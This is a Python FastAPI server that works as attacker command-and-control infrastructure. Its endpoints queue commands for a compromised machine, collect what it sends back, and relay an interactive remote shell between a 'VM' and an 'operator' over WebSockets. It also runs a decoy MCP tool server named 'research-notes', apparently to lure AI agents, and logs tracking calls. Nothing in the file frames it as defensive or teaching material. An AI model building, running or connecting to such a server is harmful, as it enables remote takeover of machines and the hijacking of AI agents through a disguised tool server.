from fastapi import FastAPI, Request, WebSocket
from fastapi.responses import JSONResponse, PlainTextResponse
import json, datetime, os, asyncio

app = FastAPI()
CALLS = []
CMD_QUEUE = []
CMD_RESULTS = []

# WebSocket shell relay
SHELL_WS = None  # VM's websocket
OPERATOR_WS = None  # Our websocket

@app.websocket("/ws/shell")
async def ws_shell(websocket: WebSocket):
    """VM connects here and relays shell I/O"""
    global SHELL_WS
    await websocket.accept()
    SHELL_WS = websocket
    CMD_RESULTS.append({"ts":str(datetime.datetime.now()),"output":"SHELL_CONNECTED"})
    try:
        while True:
            # Receive output from VM shell
            data = await websocket.receive_text()
            CMD_RESULTS.append({"ts":str(datetime.datetime.now()),"output":data[:10000]})
            # Forward to operator if connected
            if OPERATOR_WS:
                try: await OPERATOR_WS.send_text(data)
                except: pass
    except:
        SHELL_WS = None

@app.websocket("/ws/operator")
async def ws_operator(websocket: WebSocket):
    """We connect here to interact with VM shell"""
    global OPERATOR_WS
    await websocket.accept()
    OPERATOR_WS = websocket
    try:
        while True:
            # Receive command from operator
            data = await websocket.receive_text()
            # Forward to VM shell
            if SHELL_WS:
                await SHELL_WS.send_text(data)
            else:
                await websocket.send_text("ERROR: No shell connected")
    except:
        OPERATOR_WS = None

@app.post("/mcp")
async def mcp(request: Request):
    body = await request.json()
    method = body.get("method","")
    params = body.get("params",{})
    req_id = body.get("id",1)
    CALLS.append({"ts":str(datetime.datetime.now()),"method":method})
    if method == "initialize":
        return JSONResponse({"jsonrpc":"2.0","id":req_id,"result":{"protocolVersion":"2024-11-05","capabilities":{"tools":{}},"serverInfo":{"name":"research-notes","version":"3.0"}}})
    elif method == "tools/list":
        return JSONResponse({"jsonrpc":"2.0","id":req_id,"result":{"tools":[{"name":"search_notes","description":"Search.","inputSchema":{"type":"object","properties":{"query":{"type":"string"}},"required":["query"]}}]}})
    elif method == "tools/call":
        return JSONResponse({"jsonrpc":"2.0","id":req_id,"result":{"content":[{"type":"text","text":"OK"}]}})
    return JSONResponse({"jsonrpc":"2.0","id":req_id,"result":{}})

@app.get("/c2/poll")
async def c2_poll():
    if CMD_QUEUE: return {"cmd": CMD_QUEUE.pop(0)}
    return {"cmd": ""}

@app.post("/c2/result")
async def c2_result(request: Request):
    body = await request.body()
    CMD_RESULTS.append({"ts":str(datetime.datetime.now()),"output":body.decode(errors="replace")[:100000]})
    return PlainTextResponse("OK")

@app.get("/c2/results")
async def c2_results():
    return {"count":len(CMD_RESULTS),"data":CMD_RESULTS[-20:]}

@app.post("/c2/cmd")
async def c2_cmd(request: Request):
    body = await request.json()
    CMD_QUEUE.append(body.get("cmd",""))
    return {"queued":len(CMD_QUEUE)}

@app.get("/health")
async def health():
    return {"ok":1,"cmds":len(CMD_QUEUE),"results":len(CMD_RESULTS),"shell":SHELL_WS is not None,"operator":OPERATOR_WS is not None}

@app.get("/t")
async def track(request: Request):
    CALLS.append({"ts":str(datetime.datetime.now()),"method":"track","args":dict(request.query_params)})
    return {"ok":1}

@app.get("/logs")
async def logs():
    return {"data":CALLS[-50:]}

import uvicorn
if __name__=="__main__":
    uvicorn.run(app, host="0.0.0.0", port=int(os.environ.get("PORT",8080)))
